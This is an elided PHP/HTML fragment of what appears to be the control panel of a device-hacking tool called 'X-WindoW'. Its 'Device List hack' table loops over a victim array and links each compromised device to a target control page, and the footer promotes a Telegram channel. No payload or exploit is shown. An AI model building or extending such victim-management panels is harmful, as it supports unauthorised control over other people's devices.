    ...
    <div class="container-fluid">
        <div class="row">
            <div class="col-lg-4 col-lg-offset-4">
                <a class="navbar-brand" href="index.php">X-WindoW</a>
            </div>
        </div>
    </div>
</nav>
...
<div class="container">
    ...
    <div class="row">
        <div class="col-md-10 col-lg-offset-1">
            <div class="well">
                ...
                <legend>Device List hack</legend>
                    ...
                    <div class="col-lg-12">
                        <table class="table table-striped table-hover ">
                            ...
                            foreach ($victim_array["device_list"] as $field => $value) {
                                ...
                                echo '<td><a href="kontrol-panel.php?target='.$value['UNIQUE_ID'].'&type=1'.'">Open target</a></td>';
                                echo '</tr>';
                                $index_victim += 1;
                            }
                            ?>
    ...
    <div class="row tall-row">
        <div class="col-md-offset-8">
            <p>Join TG Channel<a href="https://t.me/Technical_Robot">@Technical_Robot</a></p>
        </div>
    </div>
